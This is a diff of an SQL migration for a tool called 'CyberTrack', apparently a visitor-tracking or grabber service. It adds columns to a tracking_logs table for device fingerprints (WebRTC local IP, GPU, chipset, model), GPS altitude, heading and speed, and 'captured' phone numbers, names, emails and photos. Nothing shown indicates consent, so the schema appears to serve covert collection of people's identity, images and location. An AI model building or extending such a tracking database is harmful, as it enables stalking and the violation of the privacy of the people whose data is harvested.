@@ -1,5 +1,5 @@
 -- ============================================================
--- CyberTrack v2.1 — Enhanced Hardware & Identity Migration SQL
+-- CyberTrack v2.2 — Ultimate Forensics & Photo Capture Migration SQL
 -- Run this in your Supabase project → SQL Editor
 -- ============================================================
 
@@ -31,11 +31,17 @@ ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS webrtc_local_ip      TEXT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS plugins              TEXT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS gpu_info             TEXT;
 
--- v2.1 Exact Device, Chipset, Network Speed, and Captured Phone
+-- v2.1 & v2.2 Exact Device, Chipset, Network Speed, Photo & Sensor Forensics
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS client_model         TEXT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS client_os_version    TEXT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS network_downlink     FLOAT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS network_rtt          INT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS captured_phone       TEXT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS captured_name        TEXT;
+ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS captured_email       TEXT;
+ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS captured_photo       TEXT;
 ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS chipset              TEXT;
+ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS gps_altitude         FLOAT;
+ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS gps_heading          FLOAT;
+ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS gps_speed            FLOAT;
+ALTER TABLE tracking_logs ADD COLUMN IF NOT EXISTS device_orientation   TEXT;
